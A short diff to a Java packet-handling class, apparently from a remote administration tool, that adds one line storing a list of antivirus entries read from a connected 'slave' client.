@@ -16,6 +16,8 @@ public class Packet69Antivirus extends AbstractIncomingPacket {
 		for (int i = 0; i < len; i++) {
 			antiviruses[i] = new Antivirus(slave.readLine());
 		}
+		
+		slave.setAntiviruses(antiviruses);
 	}
 
 }
